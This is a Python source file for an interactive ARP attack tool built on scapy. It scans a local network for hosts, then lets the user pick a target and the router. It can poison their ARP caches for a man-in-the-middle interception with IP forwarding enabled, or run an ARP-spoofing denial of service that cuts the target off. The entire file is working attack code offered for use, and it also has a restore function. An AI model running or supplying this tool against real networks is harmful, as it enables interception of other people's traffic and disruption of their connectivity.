import scapy.all as scapy
import os
import time
import sys


# Scan the network to display a list of devices
def scan(ip_range):
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    devices = []
    for element in answered_list:
        devices.append({"ip": element[1].psrc, "mac": element[1].hwsrc})

    return devices


# Display the list of discovered devices
def display_devices(devices):
    print("\n--- Host List ---")
    print("Index\tIP Address\t\tMAC Address")
    print("-----------------------------------------")
    for index, device in enumerate(devices):
        print(f"{index}\t{device['ip']}\t{device['mac']}")
    print("\n")


# Get the MAC address of a specific IP
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


# Send spoofed ARP packets
def spoof(target_ip, spoof_ip):
    """
    Send spoofed ARP packets to the target machine, making it think the attacker's IP is the router's IP.
    """
    target_mac = get_mac(target_ip)  # MAC address of the target device
    # Create a spoofed ARP packet to trick the target into thinking the attacker is the router
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Send the spoofed ARP packet over Ethernet
    ethernet_packet = scapy.Ether(dst=target_mac) / packet
    scapy.sendp(ethernet_packet, verbose=False)  # Use sendp to send Ethernet packets


# Restore the ARP table to its original state
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# Enable IP forwarding
def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


# Disable IP forwarding
def disable_ip_forwarding():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


# Perform a DoS attack using ARP
def dos_attack(target_ip, spoof_ip):
    try:
        print("[+] Starting DoS attack. Press Ctrl+C to stop.")
        while True:
            spoof(target_ip, spoof_ip)
            spoof(spoof_ip, target_ip)
            time.sleep(0.1)
    except KeyboardInterrupt:
        restore(target_ip, spoof_ip)
        restore(spoof_ip, target_ip)
        print("[+] ARP tables restored.")


# Main menu
def main():
    while True:
        print("\n--- ARP Tool ---")
        print("1. Scan Network")
        print("2. ARP Spoofing (MITM)")
        print("3. DoS Attack")
        print("4. Restore ARP Tables")
        print("5. Exit")

        choice = input("Select an option: ")

        if choice == "1":
            ip_range = input("Enter IP range (e.g., 192.168.1.1/24): ")
            devices = scan(ip_range)
            display_devices(devices)

        elif choice == "2":
            ip_range = input("Enter IP range (e.g., 192.168.2.0/24): ")
            devices = scan(ip_range)
            display_devices(devices)

            target_index = int(input("Select target device index: "))
            router_index = int(input("Select router device index: "))

            target_ip = devices[target_index]["ip"]
            router_ip = devices[router_index]["ip"]

            print(f"[+] Target IP: {target_ip}, Router IP: {router_ip}")
            enable_ip_forwarding()
            try:
                print("[+] Starting ARP Spoofing. Press Ctrl+C to stop.")
                while True:
                    spoof(target_ip, router_ip)
                    spoof(router_ip, target_ip)
                    time.sleep(2)
            except KeyboardInterrupt:
                disable_ip_forwarding()
                restore(target_ip, router_ip)
                restore(router_ip, target_ip)
                print("[+] ARP tables restored.")

        elif choice == "3":
            ip_range = input("Enter IP range (e.g., 192.168.2.0/24): ")
            devices = scan(ip_range)
            display_devices(devices)

            target_index = int(input("Select target device index: "))
            router_index = int(input("Select router device index: "))

            target_ip = devices[target_index]["ip"]
            router_ip = devices[router_index]["ip"]

            dos_attack(target_ip, router_ip)

        elif choice == "4":
            ip_range = input("Enter IP range (e.g., 192.168.2.0/24): ")
            devices = scan(ip_range)
            display_devices(devices)

            target_index = int(input("Select target device index: "))
            router_index = int(input("Select router device index: "))

            target_ip = devices[target_index]["ip"]
            router_ip = devices[router_index]["ip"]

            restore(target_ip, router_ip)
            restore(router_ip, target_ip)
            print("[+] ARP tables restored.")

        elif choice == "5":
            print("Exiting...")
            sys.exit()

        else:
            print("[!] Invalid option. Please try again.")


if __name__ == "__main__":
    main()
